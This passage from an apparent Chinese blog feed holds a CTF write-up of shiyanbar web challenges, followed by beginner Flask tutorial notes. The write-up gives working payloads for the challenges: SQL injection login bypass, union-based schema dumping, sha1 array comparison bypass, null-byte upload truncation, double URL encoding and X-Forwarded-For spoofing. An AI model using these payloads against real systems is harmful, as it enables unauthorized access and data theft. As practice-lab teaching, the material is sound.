guess.&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>审计得flag思路：GET的参数password必须等于SESSION[‘password’]，我们知道session是存储在服务器上，但是在本地存在一个cookie字段：session_id</p><p>我们可以将cookie字段的session_id删除，然后get的参数password为空，即可让二者相等</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/31.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/false.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/false.php</a></p><p>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password.&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;p&gt;Login first!&lt;/p&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到flag思路：GET的参数name和password不相等但是sha1加密后相等</p><p>查询得知sha1函数只能处理字符串类型，处理数组则返回FALSE，那么可以构造payload:</p><p>name[]=a&amp;password[]=b</p><p>a和b只要不相等就能得到flag</p><h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/upload/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/upload/</a></p><p>bp截取包修改文件类型无效，修改为png文件提示必须上传php文件</p><p>尝试0x00截断</p><p>在上传路径/uploads/下添加demo.php+</p><p>并将+在十六进制中的2b替换成00</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/32.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/33.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>获取flag</p><h3 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/web200.jpg" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/web200.jpg</a></p><p>给出加密函数，要求我们编写解密函数</p><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function decode($key)&#123;</span><br><span class="line">$_ = base64_decode(strrev(str_rot13($key)));</span><br><span class="line">$_o = &apos;&apos;;</span><br><span class="line">for($_0=0;$_0&lt;strlen($_);$_0++)&#123;</span><br><span class="line">$c = substr($_,$_0,1);</span><br><span class="line">$__ = chr(ord($c)-1);</span><br><span class="line">$_o = $_o.$__;</span><br><span class="line">&#125;</span><br><span class="line">$str = strrev($_o);</span><br><span class="line">return $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key = &apos;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&apos;;</span><br><span class="line">echo decode($key);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>运行结果：flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}</p><h3 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/5/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/5/index.php</a></p><p>源代码提示文件index.txt，访问得源代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if($_POST[&apos;user&apos;] &amp;&amp; $_POST[&apos;pass&apos;]) &#123;</span><br><span class="line">$conn = mysql_connect(&quot;********&quot;, &quot;*****&quot;, &quot;********&quot;);</span><br><span class="line">mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);</span><br><span class="line">if ($conn-&gt;connect_error)&#123;</span><br><span class="line">die(&quot;Connection failed: &quot; . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">$user = $_POST[&apos;user&apos;];</span><br><span class="line">$pass = md5($_POST[&apos;pass&apos;]);</span><br><span class="line"></span><br><span class="line">$sql = &quot;select pw from php where user=&apos;$user&apos;&quot;;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line">if (!$query) &#123;</span><br><span class="line">printf(&quot;Error: %s\n&quot;, mysql_error($conn));</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line">//echo $row[&quot;pw&quot;];</span><br><span class="line">  </span><br><span class="line">if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line">echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>对参数$user不存在过滤，可以进行sql注入，进而控制查询结果的pw列的数据</p><p>因为$pass是我们POST的参数pass经过md5加密后得到的值</p><p>所以构造payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&apos; union select md5(&apos;1&apos;)#&amp;pass=1</span><br></pre></td></tr></table></figure><p>得到flag:SimCTF{youhaocongming} </p><h3 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h3><p>网址：<a href="http://ctf5.shiyanbar.com/DUTCTF/1.html" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/DUTCTF/1.html</a></p><p>页面显示一段jsfuck代码</p><p>直接放到浏览器控制台运行</p><p>弹出密码：Ihatejs</p><p>尝试即为flag</p><h3 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h3><p>网址：<a href="http://ctf5.shiyanbar.com/DUTCTF/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/DUTCTF/index.php</a></p><p>源代码给出提示文件index.php.txt </p><p>访问得源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>考察url二次编码，将hackerDJ进行二次url编码后作为参数id值，浏览器首先会对id值进行一次url解码，之后绕过eregi检测后再对一次解码后的值进行二次解码，解码后得hackerDJ</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%2568%2561%2563%256b%2565%2572%2544%254a</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/34.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="这个看起来有点简单"><a href="#这个看起来有点简单" class="headerlink" title="这个看起来有点简单!"></a>这个看起来有点简单!</h3><p>网址：<a href="http://ctf5.shiyanbar.com/8/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php</a></p><p>输入1’,1”都报错，输入1%23返回正确信息</p><p>说明id未被引号包裹</p><p>进行sql注入：</p><p>注数据库payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%20union%20select%201,database()%23</span><br></pre></td></tr></table></figure><p>数据库名：my_db </p><p>注数据表payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23</span><br></pre></td></tr></table></figure><p>数据表名：news,thiskey </p><p>注数据列payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%20union%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27thiskey%27%23</span><br></pre></td></tr></table></figure><p>列名：k0y </p><p>注数据payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%20union%20select%201,k0y%20from%20thiskey%23</span><br></pre></td></tr></table></figure><p>flag: whatiMyD91dump </p><h3 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h3><p>网址：<a href="http://ctf5.shiyanbar.com/phpaudit/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/phpaudit/</a></p><p>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetIP</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>]))</span><br><span class="line">$cip = $_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>];</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>]))</span><br><span class="line">$cip = $_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>];</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]))</span><br><span class="line">$cip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">$cip = <span class="string">"0.0.0.0"</span>;</span><br><span class="line"><span class="keyword">return</span> $cip;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$GetIPs = GetIP();</span><br><span class="line"><span class="keyword">if</span> ($GetIPs==<span class="string">"1.1.1.1"</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Great! Key is *********"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"错误！你的IP不在访问列表之内！"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>burp抓包添加X-Forwarded-For:1.1.1.1即可获得flag:SimCTF{daima_shengji}</p><h3 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h3><p>网址：<a href="http://ctf5.shiyanbar.com/sHeader/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/sHeader/</a></p><p>页面给了提示http header</p><p>Please make sure you have installed .net framework 9.9!</p><p>Make sure you are in the region of England and browsing this site with Internet Explorer</p><p>思路就是修改http请求头部的User-Agent字段和Accept-Language字段</p><p>第一个是安装.net9.9框架  第二个是保证在英国地区 第三个是用ie浏览器 </p><p>第一个和第三个我们可以在User-Agent后加上(MSIE 9.0;.NET CLR 9.9)来实现</p><p>最后一个在英国我们把语言改成en-gb即可</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/35.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h3><p>网址：<a href="http://ctf5.shiyanbar.com/basic/catch/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/basic/catch/</a></p><p>提示catch，bp抓包发现响应头部字段Content-Row: MTUzNzAzMDU2OA==</p><p>经过base64解密后1537030568</p><p>作为pass_key提交无果，直接提交pass_key=MTUzNzAzMDU2OA==得到flag</p><p>KEY: #WWWnsf0cus_NET#</p><h3 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h3><p>网址：<a href="http://ctf5.shiyanbar.com/basic/inject/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/basic/inject/index.php</a></p><p>注入点在admin,使用基于时间的盲注，脚本略</p>]]></content>
    
    <summary type="html">
    
      ctf
    
    </summary>
    
      <category term="ctf" scheme="https://Foxgrin.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Python-flask</title>
    <link href="https://Foxgrin.github.io//posts/11047/"/>
    <id>https://Foxgrin.github.io//posts/11047/</id>
    <published>2018-09-08T06:06:00.000Z</published>
    <updated>2018-09-17T12:23:30.654Z</updated>
    
    <content type="html"><![CDATA[<p>Python-flask学习笔记<a id="more"></a></p><h2 id="Python虚拟环境安装"><a href="#Python虚拟环境安装" class="headerlink" title="Python虚拟环境安装"></a>Python虚拟环境安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install virtualenv</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/flask/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Python激活虚拟环境"><a href="#Python激活虚拟环境" class="headerlink" title="Python激活虚拟环境"></a>Python激活虚拟环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virtualenv [virtualenv-name]</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/flask/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">activate</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/flask/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="pip安装flask"><a href="#pip安装flask" class="headerlink" title="pip安装flask"></a>pip安装flask</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask</span><br></pre></td></tr></table></figure><h2 id="使用pycharm创建新项目"><a href="#使用pycharm创建新项目" class="headerlink" title="使用pycharm创建新项目"></a>使用pycharm创建新项目</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/flask/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="程序基本结构"><a href="#程序基本结构" class="headerlink" title="程序基本结构"></a>程序基本结构</h2><h3 id="初始化Flask对象"><a href="#初始化Flask对象" class="headerlink" title="初始化Flask对象"></a>初始化Flask对象</h3><p>传递一个参数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1.方便flask框架去寻找资源</span><br><span class="line"></span><br><span class="line">2.方便flask插件比如Flask-Sqlalchemy出现错误时候好去寻找问题所在</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from flask import Flask</span><br><span class="line">app = Flask(__name__)</span><br></pre></td></tr></table></figure></p><h3 id="创建路由与视图函数"><a href="#创建路由与视图函数" class="headerlink" title="创建路由与视图函数"></a>创建路由与视图函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World!'</span></span><br></pre></td></tr></table></figure><p>@app.route是一个装饰器，以@开头，并且在函数的上面，说明是装饰器</p><p>这个装饰器的作用，是做一个url与视图函数的映射，处理函数与url之间的映射成为路由</p><p>127.0.0.1:5000/     -&gt;     去请求hello_world这个视图函数，然后将结果返回给服务器</p><h3 id="启动服务器"><a href="#启动服务器" class="headerlink" title="启动服务器"></a>启动服务器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure><p>app.run()作用是启动一个应用服务器，来接受用户的请求</p><h3 id="完整程序"><a href="#完整程序" class="headerlink" title="完整程序"></a>完整程序</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World!'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><h2 id="设置debug模式"><a href="#设置debug模式" class="headerlink" title="设置debug模式"></a>设置debug模式</h2><p>1.在app.run()中传入一个关键字参数debug,app.run(debug=True)，就设置当前项目为debug模式</p><p>2.debug模式的两大功能：</p><p>(1)当程序出现问题的时候，可以在页面中看到错误信息和出错的位置。</p><p>(2)只要修改了项目中的python文件，程序会自动加载，不需要手动重新启动服务器</p><h2 id="url传参数"><a href="#url传参数" class="headerlink" title="url传参数"></a>url传参数</h2><p>1.参数的作用：可以在相同的URL,但是指定不同的参数，来加载不同的数据</p><p>2.在flask中使用参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/article/&lt;id&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">article</span><span class="params">(id)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">u'您请求的参数是: %s '</span>%id</span><br></pre></td></tr></table></figure><p>参数需要放在两个尖括号中</p><p>视图函数中需要放和url中的参数同名的参数</p><h2 id="反转url"><a href="#反转url" class="headerlink" title="反转url"></a>反转url</h2><p>1.什么叫做反转URL：从视图函数到url的转换叫做反转url</p><p>2.反转url的用处：</p><p>(1)在页面重定向的时候，会使用url反转</p><p>(2)在模板中，也会使用url反转</p><p>3.例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> url_for(<span class="string">'my_list'</span>)</span><br><span class="line">    <span class="keyword">print</span> url_for(<span class="string">'article'</span>,id=<span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/list/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_list</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'list'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/article/&lt;id&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">article</span><span class="params">(id)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">u'您请求的参数是: %s '</span>%id</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/flask/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="页面跳转和重定向"><a href="#页面跳转和重定向" class="headerlink" title="页面跳转和重定向"></a>页面跳转和重定向</h2><p>1.用处：在用户访问一些需要登录的页面的时候，如果用户没有登录，那么可以让他重定向到登录页面</p><p>2.代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> redirect,url_for</span><br><span class="line">redirect(url_for(<span class="string">'login'</span>))</span><br></pre></td></tr></table></figure><p>3.例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect,url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    login_url = url_for(<span class="string">'login'</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(login_url)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">u'这是首页'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">u'这是登录页面'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>访问127.0.0.1:5000/自动跳转到127.0.0.1:5000/login/</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect,url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    login_url = url_for(<span class="string">'login'</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(login_url)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">u'这是首页'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">u'这是登录页面'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/question/&lt;is_login&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">question</span><span class="params">(is_login)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_login == <span class="string">'1'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">u'这是发布问答的页面'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>如果我们访问127.0.0.1:5000/question/0则自动重定向到登录页面</p><h2 id="Flask渲染jinja2模板和传参"><a 